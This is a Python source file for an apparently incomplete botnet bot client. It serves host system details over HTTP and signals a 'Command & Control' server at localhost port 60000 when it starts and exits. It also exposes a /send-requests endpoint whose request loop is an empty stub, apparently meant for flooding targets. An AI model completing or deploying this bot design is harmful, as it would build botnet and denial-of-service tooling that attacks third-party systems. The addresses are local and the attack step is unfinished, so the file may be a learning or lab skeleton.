import atexit
import contextlib
import platform
import requests
import socket
import json

from http.server import BaseHTTPRequestHandler, HTTPServer


class Bot(BaseHTTPRequestHandler):

    def do_GET(self):
        if self.path == '/info':
            self.GET_info()
        elif self.path == '/status':
            self.send_response(200)
            self.end_headers()

        else:
            self.send_response(404)
            self.end_headers()

    def GET_info(self):
        self.send_response(200)
        info = platform.uname()._asdict()
        info['processor'] = platform.processor()
        print(info)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(bytes(json.dumps(info), "utf-8"))

    def do_POST(self):
        if self.path == '/send-requests':
            self.send_requests(0, 0)

    def send_requests(self, url, n):
        for _ in range(n):
            pass


CNC_ADDR = "127.0.0.1"
CNC_PORT = 60000


def start():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((CNC_ADDR, CNC_PORT))
        s.send(b"n")


def exit_handler():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((CNC_ADDR, CNC_PORT))
        s.send(b"c")


if __name__ == '__main__':

    bot = HTTPServer(('127.0.0.1', 8080), Bot)

    try:
        start()
        print("Connected to the Command & Control")
        atexit.register(exit_handler)
        bot.serve_forever()
    except ConnectionRefusedError as e:
        print("Cannot establish the connection to Command & Control")
    except KeyboardInterrupt as e:
        pass
    finally:
        print("Closing program...")
